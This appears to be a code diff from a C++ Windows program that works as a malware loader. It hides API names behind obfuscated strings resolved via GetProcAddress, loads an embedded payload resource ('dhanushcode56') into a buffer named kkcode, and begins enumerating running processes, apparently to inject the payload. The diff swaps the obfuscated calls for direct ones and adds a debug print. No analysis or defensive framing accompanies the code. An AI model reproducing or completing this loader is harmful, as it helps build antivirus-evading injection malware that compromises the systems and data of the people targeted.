@@ -29,12 +29,21 @@ void loadkumres(const char* rssssame, char** data, DWORD* size) {
     FARPROC pLoadResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loa_res, big_string, sizeof(loa_res)).c_str());
     auto pLockResource = (char*(WINAPI*)(HGLOBAL))GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
     FARPROC pSizeofResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
-    HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pGetModuleHandle)(NULL);
-    HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource)(hModule, rssssame, RT_RCDATA);
+    
+    //HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pGetModuleHandle)(NULL);
+    //HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource)(hModule, rssssame, RT_RCDATA);
 
-    HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
-    *size = ((DWORD(WINAPI*)(HMODULE, HRSRC))pSizeofResource)(hModule, hResource);
-    *data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
+    //HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
+    //*size = ((DWORD(WINAPI*)(HMODULE, HRSRC))pSizeofResource)(hModule, hResource);
+    //*data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
+
+
+    HMODULE hModule = GetModuleHandle(NULL);
+    HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);
+
+    HGLOBAL hResData = LoadResource(hModule, hResource);
+    *size = SizeofResource(hModule, hResource);
+    *data = (char*)LockResource(hResData);
 }
 
 int main() {
@@ -49,7 +58,8 @@ int main() {
     char* kkcode;
     DWORD kkcodeLen;
     loadkumres("dhanushcode56", &kkcode, &kkcodeLen);
-    
+
+    std::cout << "hello i reached this stage" << std::endl;
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
